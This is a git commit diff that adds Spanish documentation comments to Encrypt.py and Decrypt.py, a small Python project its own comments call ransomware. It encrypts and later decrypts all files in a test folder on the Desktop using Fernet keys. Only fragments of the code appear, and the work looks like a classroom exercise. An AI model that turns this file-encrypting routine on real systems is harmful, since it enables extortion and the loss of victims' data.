4d4acf3dbd1150840c668726389b5c0be1d3ca3f
Erick Pérez <ericksebas2001@gmail.com>
2022-08-14 20:25:53 -0500

    Documentacion de todos los metodos

--- Decrypt.py
+++ Decrypt.py
@@ -1,18 +1,25 @@
 from cryptography.fernet import Fernet
 import os
 import getpass
+#Para la prueba de este programa es necesario la creacion de una carpeta
+#en el escritorio de nombre "Ataque" y dentro de esta otra carpeta
+#de nombre "Primera prueba"
+
+#Este archivo se usa una vez se ha concluido el rescate
 
 
+#Genera la key con la que se encriptara los archivos y la exporta en un archivo con extension key
 def generarkey():
     key = Fernet.generate_key()
     with open("key.key","wb") as key_file:
         key_file.write(key)
 
-
+#Permite obtener el key que permite la encripcion y la desencripcion
 def retornarkey():
     return open("key.key", "rb").read()
 
-
+#Permite la desencripcion de los archivos contenidos en el directorio indicado
+#esto se realiza a traves de la desencripcion de Fernet
 def decrypt(items, key):
     i = Fernet(key)
     for x in items:
@@ -23,7 +30,7 @@ def decrypt(items, key):
         with open(x,"wb") as file:
             file.write(data)
 
-
+#Permite que el codigo se ejecute en el modulo es el equivalente a la funcion main en JAVA
 if __name__ == "__main__":
     archivos = 'C:\\Users\\'+getpass.getuser()+'\\Desktop\\Ataque\\Primera prueba'
     os.remove(archivos+"\\"+"readme.txt")
--- Encrypt.py
+++ Encrypt.py
@@ -1,18 +1,27 @@
 from cryptography.fernet import Fernet
 import os
 import getpass
+#Para la prueba de este programa es necesario la creacion de una carpeta
+#en el escritorio de nombre "Ataque" y dentro de esta otra carpeta
+#de nombre "Primera prueba"
 
+#Este archivo es el ransomware como tal y se encarga de encriptar
+#los archivos y pedir el rescate
+
+
+#Genera la key con la que se encriptara los archivos y la exporta en un archivo con extension key
 
 def generarkey():
     key = Fernet.generate_key()
     with open("key.key","wb") as key_file:
         key_file.write(key)
 
-
+#Permite obtener el key que permite la encripcion y la desencripcion
 def retornarkey():
     return open("key.key", "rb").read()
 
-
+#Permite la encripcion de los archivos contenidos en el directorio indicado
+#esto se realiza a traves de la encripcion de Fernet
 def encrypt(items, key):
     i = Fernet(key)
     for x in items:
@@ -23,7 +32,7 @@ def encrypt(items, key):
         with open(x,"wb") as file:
             file.write(data)
 
-
+#Permite que el codigo se ejecute en el modulo es el equivalente a la funcion main en JAVA
 if __name__ == "__main__":
     archivos = 'C:\\Users\\'+getpass.getuser()+'\\Desktop\\Ataque\\Primera prueba'
     items = os.listdir(archivos)
